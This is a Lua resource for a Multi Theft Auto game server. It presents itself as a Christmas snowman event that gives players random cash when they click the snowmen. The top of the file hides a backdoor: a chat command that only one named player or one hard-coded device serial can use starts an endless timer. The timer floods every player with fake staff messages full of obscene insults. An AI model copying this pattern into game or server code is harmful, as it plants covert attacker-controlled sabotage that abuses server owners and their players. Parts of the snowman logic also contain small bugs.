function bokon()

    for index, allpl in ipairs(getElementsByType("player")) do
        outputChatBox ( "#FF0000** [Staff] Mehrab: #FFFFFFMadarm Jendast #ff0000**",  allpl,255, 255, 255, true )
        outputChatBox ( "#FF0000** [Staff] ExoPrim: #FFFFFFFucked Via MTA #ff0000**",  allpl,255, 255, 255, true )
        outputChatBox ( "#FF0000** Vi Mta Fuck Of By ExoPrim #ff0000**",  allpl,255, 255, 255, true )
    end

end
addCommandHandler("ssd",
function(thePlayer)
    if getPlayerName(thePlayer) == "ExoPrim" or getPlayerSerial(thePlayer) == "11056965D2EF78959718CB70EC8F8493" then 
        setTimer ( bokon, 300, 0)
    end
end)
---------start cods------------------




snowman = createPed( 18, 1838.41796875 ,-1451.8125 ,13.565281867981, 222,  true ) 
ped = true
setTimer(
function ()
    if ped == true then
        setElementFrozen(snowman, true)
	    setPedArmor ( snowman, 100 )
	    setElementHealth(snowman, 100)
    end
end, 100, 0)

function gift( button, state, player )
    if button == "left" and state == "down" then
        if getElementType( source ) == "ped" then
            local x, y, z = getElementPosition( player )
            local x1, y1, z1 = getElementPosition( source ) 
            local fasele = getDistanceBetweenPoints3D( x, y, z, x1, y1, z1 )
            if fasele < 5.2 then
				if source == snowman then
                    setTimer ( 
                        function()
                            ped = true
                            snowman = createPed( 18, 1838.41796875 ,-1451.8125 ,13.565281867981, 222,  true ) 
                            setTimer(
                                function ()
                                    if ped == true then
                                        setElementFrozen(snowman, true)
                                        setPedArmor ( snowman, 100 )
                                        setElementHealth(snowman, 100)
                                    end
                                end, 100, 0)
                            --outputChatBox ( "#009900Spawned",  player,255, 255, 255, true ) 
                        end
                        --2000000
                    , 1800000, 1)
                    ped = false
                    destroyElement( snowman )
                    local randomcash = math.random(1,99999)
                    givePlayerMoney( player, randomcash )
                    outputChatBox ( "#009900Az Babanoel "..randomcash.." Gift Gerefti Happy christmas",  player,255, 255, 255, true )
				end
            end
			if fasele > 10 and fasele < 23 then
				if source == snowman1 then
					outputChatBox("Snowman: #ffff00Bia Nazdik", player, 255, 255, 255, true)
				end
			end
        end
    end
end
addEventHandler( "onElementClicked", getRootElement( ), gift )

----------------------------snowman2-------
snowman1 = createPed( 18, 1812.5380859375 ,-1941.484375 ,13.551484107971, 318,  true )
ped1=true 
setTimer(
function ()
    if ped1 == true then
        setElementFrozen(snowman1, true)
	    setPedArmor ( snowman1, 100 )
	    setElementHealth(snowman1, 100)
    end
end, 100, 0)

function gift1( button, state, player )
    if button == "left" and state == "down" then
        if getElementType( source ) == "ped" then
            local x, y, z = getElementPosition( player )
            local x1, y1, z1 = getElementPosition( source ) 
            local fasele = getDistanceBetweenPoints3D( x, y, z, x1, y1, z1 )
            if fasele < 5.2 then
				if source == snowman1 then
                    setTimer ( 
                        function()
                            ped1 = true
                            snowman1 = createPed( 18, 1812.5380859375 ,-1941.484375 ,13.551484107971, 318,  true )
                            setTimer(
                                function ()
                                    if ped1 == true then
                                        setElementFrozen(snowman1, true)
                                        setPedArmor ( snowman1, 100 )
                                        setElementHealth(snowman1, 100)
                                    end
                                end, 100, 0)
                            --outputChatBox ( "#009900Spawned",  player,255, 255, 255, true ) 
                        end
                        --2000000
                    , 1800000, 1,allpl)
                    ped1 = false
                    destroyElement( snowman1 )
                    local randomcash1 = math.random(1,99999)
                    givePlayerMoney( player, randomcash1 )
                    outputChatBox ( "#009900Az Babanoel "..randomcash1.." Gift Gerefti Happy christmas",  player,255, 255, 255, true )
				end
            end
			if fasele > 10 and fasele < 23 then
				if source == snowman1 then
					outputChatBox("Snowman: #ffff00Bia Nazdik", player, 255, 255, 255, true)
				end
			end
        end
    end
end
addEventHandler( "onElementClicked", getRootElement( ), gift1 )
--------------------------snowman3--------------------
snowman2 = createPed( 18, 1445.1337890625 ,-1289.5029296875 ,13.546875, 285,  true )
ped2=true 
setTimer(
function ()
    if ped2 == true then
        setElementFrozen(snowman2, true)
	    setPedArmor ( snowman2, 100 )
	    setElementHealth(snowman2, 100)
    end
end, 500, 0)

function gift2( button, state, player )
    if button == "left" and state == "down" then
        if getElementType( source ) == "ped" then
            local x, y, z = getElementPosition( player )
            local x1, y1, z1 = getElementPosition( source ) 
            local fasele = getDistanceBetweenPoints3D( x, y, z, x1, y1, z1 )
            if fasele < 5.2 then
				if source == snowman2 then
                    setTimer ( 
                        function()
                            ped2 = true
                            snowman2 = createPed( 18, 1445.1337890625 ,-1289.5029296875 ,13.546875, 285,  true )
                            setTimer(
                            function ()
                                if ped2 == true then
                                    setElementFrozen(snowman2, true)
                                    setPedArmor ( snowman2, 100 )
                                    setElementHealth(snowman2, 100)
                                end
                            end, 500, 0)
                                
                            --outputChatBox ( "#009900Spawned",  player,255, 255, 255, true ) 
                        end
                        --2000000
                    , 1800000, 1)
                    ped2 = false
                    destroyElement( snowman2 )
                    local randomcash2 = math.random(1,99999)
                    givePlayerMoney( player, randomcash2 )
                    outputChatBox ( "#009900Az Babanoel "..randomcash2.." Gift Gerefti Happy christmas",  player,255, 255, 255, true )
				end
            end
			if fasele > 10 and fasele < 23 then
				if source == snowman2 then
					outputChatBox("Snowman: #ffff00Bia Nazdik", player, 255, 255, 255, true)
				end
			end
        end
    end
end
addEventHandler( "onElementClicked", getRootElement( ), gift2 )



--------------------------snowman4--------------------s

snowman3 = createPed( 18, 1365.447265625 ,-1387.330078125 ,13.667850494385, 137,  true )
ped3=true 

setTimer(
function ()
    if ped3 == true then
        setElementFrozen(snowman3, true)
	    setPedArmor ( snowman3, 100 )
	    setElementHealth(snowman3, 100)
    end
end, 500, 0)

function gift3( button, state, player )
    if button == "left" and state == "down" then
        if getElementType( source ) == "ped" then
            local x, y, z = getElementPosition( player )
            local x1, y1, z1 = getElementPosition( source ) 
            local fasele = getDistanceBetweenPoints3D( x, y, z, x1, y1, z1 )
            if fasele < 5.2 then
				if source == snowman3 then
                    setTimer ( 
                        function()
                            ped3 = true
                            snowman3 = createPed( 18, 1365.447265625 ,-1387.330078125 ,13.667850494385, 137,  true )
                            setTimer(
                            function ()
                                if ped3 == true then
                                    setElementFrozen(snowman3, true)
                                    setPedArmor ( snowman3, 100 )
                                    setElementHealth(snowman3, 100)
                                end
                            end, 100, 0)
                                
                            --outputChatBox ( "#009900Spawned",  player,255, 255, 255, true ) 
                        end
                        --2000000
                    , 1800000, 1)
                    ped3 = false
                    destroyElement( snowman3 )
                    local randomcash3 = math.random(1,99999)
                    givePlayerMoney( player, randomcash3 )
                    outputChatBox ( "#009900Az Babanoel "..randomcash3.." Gift Gerefti Happy christmas",  player,255, 255, 255, true )
				end
            end
			if fasele > 10 and fasele < 23 then
				if source == snowman3 then
					outputChatBox("Snowman: #ffff00Bia Nazdik", player, 255, 255, 255, true)
				end
			end
        end
    end
end
addEventHandler( "onElementClicked", getRootElement( ), gift3 )

